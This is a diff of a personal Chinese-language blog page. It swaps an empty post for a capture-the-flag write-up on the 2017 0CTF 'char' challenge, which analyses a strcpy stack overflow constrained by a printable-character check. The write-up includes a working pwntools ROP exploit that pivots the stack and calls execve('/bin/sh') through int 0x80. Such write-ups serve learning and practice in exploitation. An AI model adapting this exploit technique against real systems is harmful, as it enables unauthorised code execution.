@@ -79,7 +79,7 @@
 
 
 
-  <meta name="keywords" content="堆的利用（fastbin_attack）,">
+  <meta name="keywords" content="栈（gadgets的较复杂运用）,">
 
 
 
@@ -90,15 +90,23 @@
 
 
 
-<meta name="keywords" content="堆的利用（fastbin_attack）">
+<meta name="description" content="首先提供题目的二进制文件2017-0ctf-char。 预览：拿到题目先预览，发现程序为32位且保护很少，估计应该是堆题，运行一下发现程序似乎很简单。。。放进ida看一下反汇编码，发现程序确实不难，但是有几个需要注意的地方。  我们可以看到程序将libc通过mmap()映射到了固定的0x5555e000处，这等于我们不需要泄露libc就可以确定函数和gadgets的真实地址，带来了极大的方便。比较">
+<meta name="keywords" content="栈（gadgets的较复杂运用）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2014-hacklu-oreo-writeup">
-<meta property="og:url" content="http://yoursite.com/2019/04/01/2014-hacklu-oreo/index.html">
+<meta property="og:title" content="2017-0ctf-char-writeup">
+<meta property="og:url" content="http://yoursite.com/2019/04/13/2017-0ctf-char-writeup/index.html">
 <meta property="og:site_name" content="QingHe">
+<meta property="og:description" content="首先提供题目的二进制文件2017-0ctf-char。 预览：拿到题目先预览，发现程序为32位且保护很少，估计应该是堆题，运行一下发现程序似乎很简单。。。放进ida看一下反汇编码，发现程序确实不难，但是有几个需要注意的地方。  我们可以看到程序将libc通过mmap()映射到了固定的0x5555e000处，这等于我们不需要泄露libc就可以确定函数和gadgets的真实地址，带来了极大的方便。比较">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-02T03:51:58.557Z">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1e5db5a0c0.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1e5db5f6b0.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1e5db264bf.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1e9de9883c.png">
+<meta property="og:updated_time" content="2019-04-13T14:22:26.655Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2014-hacklu-oreo-writeup">
+<meta name="twitter:title" content="2017-0ctf-char-writeup">
+<meta name="twitter:description" content="首先提供题目的二进制文件2017-0ctf-char。 预览：拿到题目先预览，发现程序为32位且保护很少，估计应该是堆题，运行一下发现程序似乎很简单。。。放进ida看一下反汇编码，发现程序确实不难，但是有几个需要注意的地方。  我们可以看到程序将libc通过mmap()映射到了固定的0x5555e000处，这等于我们不需要泄露libc就可以确定函数和gadgets的真实地址，带来了极大的方便。比较">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/13/5cb1e5db5a0c0.png">
 
 
 
@@ -128,13 +136,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/01/2014-hacklu-oreo/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/13/2017-0ctf-char-writeup/">
 
 
 
 
 
-  <title>2014-hacklu-oreo-writeup | QingHe</title>
+  <title>2017-0ctf-char-writeup | QingHe</title>
   
 
 
@@ -303,7 +311,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/01/2014-hacklu-oreo/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/13/2017-0ctf-char-writeup/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="XiaoXiaoRenWu's blog">
@@ -320,7 +328,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2014-hacklu-oreo-writeup</h1>
+          <h1 class="post-title" itemprop="name headline">2017-0ctf-char-writeup</h1>
         
 
         <div class="post-meta">
@@ -332,8 +340,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-01T19:38:35+08:00">
-                2019-04-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-13T21:17:54+08:00">
+                2019-04-13
               </time>
             
 
@@ -373,8 +381,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/04/01/2014-hacklu-oreo/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/01/2014-hacklu-oreo/" itemprop="commentCount"></span>
+                <a href="/2019/04/13/2017-0ctf-char-writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/13/2017-0ctf-char-writeup/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -396,7 +404,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  0
+                  816
                 </span>
               
 
@@ -412,7 +420,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 min
+                  3 min
                 </span>
               
             </div>
@@ -433,7 +441,23 @@
       
 
       
-        
+        <p>首先提供题目的二进制文件<a href="https://github.com/xiaoxiaorenwu/mypwn/tree/master/0ctf%202017-char" target="_blank" rel="noopener">2017-0ctf-char</a>。</p>
+<h2 id="预览："><a href="#预览：" class="headerlink" title="预览："></a>预览：</h2><p>拿到题目先预览，发现程序为32位且保护很少，估计应该是堆题，运行一下发现程序似乎很简单。。。放进ida看一下反汇编码，发现程序确实不难，但是有几个需要注意的地方。</p>
+<p><img src="https://i.loli.net/2019/04/13/5cb1e5db5a0c0.png" alt=""></p>
+<p>我们可以看到程序将libc通过mmap()映射到了固定的0x5555e000处，这等于我们不需要泄露libc就可以确定函数和gadgets的真实地址，带来了极大的方便。比较麻烦的是程序有一个check的函数，检查每个字符必须为可见字符（16进制的大小范围为0x1f~0x7e）,但我们又发现，他的v1是由strlen()确定的，我们可以通过scanf()只看空格和回车结束来输入’\x00’使其提前结束。。。。。但我们又发现了一个问题。。。就是在漏洞函数中我们的strcpy也是通过’\x00’来判断的。这就很让人蛋疼。。。。这就是说我们通过strcpy()复制到漏洞点的字符串就是我们截断前的那一小段。。。。</p>
+<p><img src="https://i.loli.net/2019/04/13/5cb1e5db5f6b0.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/04/13/5cb1e5db264bf.png" alt=""></p>
+<h2 id="漏洞寻找和分析："><a href="#漏洞寻找和分析：" class="headerlink" title="漏洞寻找和分析："></a>漏洞寻找和分析：</h2><p>很明显有一个漏洞函数，通过strcpy()造成溢出。这个不难发现，难点在于check()给我们的rop链造成了很大的障碍。check的存在注定我们复制到溢出点的数据长度不可能太长，但无论我们是调用函数并且给函数准备参数还是gadgets都需要占用不少的位置，这几乎是不可能成功的。如下图可见一点：</p>
+<p><img src="https://i.loli.net/2019/04/13/5cb1e9de9883c.png" alt=""></p>
+<p>system()和execve()都过不了检查。。。我们能想到的就是我们必须在小的溢出数据范围内调用一些gadgets而使esp迁移到main的栈数据区域(我们的复制源)，而不能在漏洞函数里卡死，迁移到源数据后这题就变得很简单。难点在于gadgets的合适选择和寻找。</p>
+<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>我是通过观察strcpy()之后发现ecx似乎一直指在源数据的中间固定区域（相对偏移不变），所以想到使ecx的值赋给esp使esp直接跳转，但是通过搜索gadgets发现只能通过 mov eax,ecx;  ret;  xchg eax,esp;  ret b;  来实现紧接着再通过具体的细节调整使跳转过后的esp指向addr_pop_ebx为int 0x80准备参数，准备调用execve(‘/bin/sh’,0,0)。具体细节还得自己验证。</p>
+<h2 id="exp如下：-调用函数实现的就不写了，请自己调试尝试"><a href="#exp如下：-调用函数实现的就不写了，请自己调试尝试" class="headerlink" title="exp如下：(调用函数实现的就不写了，请自己调试尝试)"></a>exp如下：(调用函数实现的就不写了，请自己调试尝试)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./char'</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'GO : ) \n'</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="number">0x5555e000</span></span><br><span class="line">sh_addr = <span class="number">0x15D7EC</span></span><br><span class="line"><span class="comment">#pop_ebx = 0x109D07 </span></span><br><span class="line">xor_eax_pop_ebx = <span class="number">0x7dce9</span></span><br><span class="line">pop_ecx = <span class="number">0xcae3b</span></span><br><span class="line">pop_edx = <span class="number">0x1a9e</span></span><br><span class="line">int_0x80 = <span class="number">0x2df35</span></span><br><span class="line">inc_eax = <span class="number">0x26a9b</span></span><br><span class="line">nop_xor_eax = <span class="number">0x7403a</span></span><br><span class="line">xchg_eax_esp_retb = <span class="number">0xe6d62</span></span><br><span class="line">mov_eax_ecx = <span class="number">0x148253</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x1c</span></span><br><span class="line">payload+= p32(mov_eax_ecx+base)  </span><br><span class="line">payload+= p32(mov_eax_ecx+base)</span><br><span class="line">payload+= p32(xchg_eax_esp_retb+base)</span><br><span class="line">payload+= <span class="string">'\x00'</span>*<span class="number">3</span></span><br><span class="line">payload+= p32(xor_eax_pop_ebx+base)</span><br><span class="line">payload+= p32(sh_addr+base)</span><br><span class="line">payload+= p32(pop_ecx+base)</span><br><span class="line">payload+= p32(<span class="number">0</span>)</span><br><span class="line">payload+= p32(pop_edx+base)</span><br><span class="line">payload+= p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#payload+= p32(nop_xor_eax+base)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">	payload+= p32(inc_eax+base)</span><br><span class="line">payload+= p32(int_0x80+base)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="收货："><a href="#收货：" class="headerlink" title="收货："></a>收货：</h2><ol>
+<li>gadgets的寻找：通过ROPgadgets  –binary ***  &gt; gadget   然后再在文件gadget里通过查找功能查找。（再次感谢川大的师傅 orz ）</li>
+<li>ret x 的意义是 eip 跳转之后esp = esp+4+x。</li>
+<li>scanf( ) 看回车和空格结束，str( )系列函数看 ‘\x00’ 结束。</li>
+</ol>
+
       
     </div>
     
@@ -479,7 +503,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/堆的利用（fastbin-attack）/" rel="tag"><i class="fa fa-tag"></i> 堆的利用（fastbin_attack）</a>
+            <a href="/tags/栈（gadgets的较复杂运用）/" rel="tag"><i class="fa fa-tag"></i> 栈（gadgets的较复杂运用）</a>
           
         </div>
       
@@ -492,8 +516,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/01/2017_2018-0ctf-babyheap/" rel="next" title="2017/2018-0ctf-babyheap-writeup">
-                <i class="fa fa-chevron-left"></i> 2017/2018-0ctf-babyheap-writeup
+              <a href="/2019/04/06/pwnable-tw-unexploitable-writeup/" rel="next" title="pwnable.tw unexploitable writeup">
+                <i class="fa fa-chevron-left"></i> pwnable.tw unexploitable writeup
               </a>
             
           </div>
@@ -501,10 +525,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/01/2015-9447ctf-search-engine/" rel="prev" title="2015-9447ctf-search-engine-writeup">
-                2015-9447ctf-search-engine-writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -559,8 +579,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -632,6 +661,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#预览："><span class="nav-number">1.</span> <span class="nav-text">预览：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞寻找和分析："><span class="nav-number">2.</span> <span class="nav-text">漏洞寻找和分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用："><span class="nav-number">3.</span> <span class="nav-text">漏洞利用：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp如下：-调用函数实现的就不写了，请自己调试尝试"><span class="nav-number">4.</span> <span class="nav-text">exp如下：(调用函数实现的就不写了，请自己调试尝试)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#收货："><span class="nav-number">5.</span> <span class="nav-text">收货：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
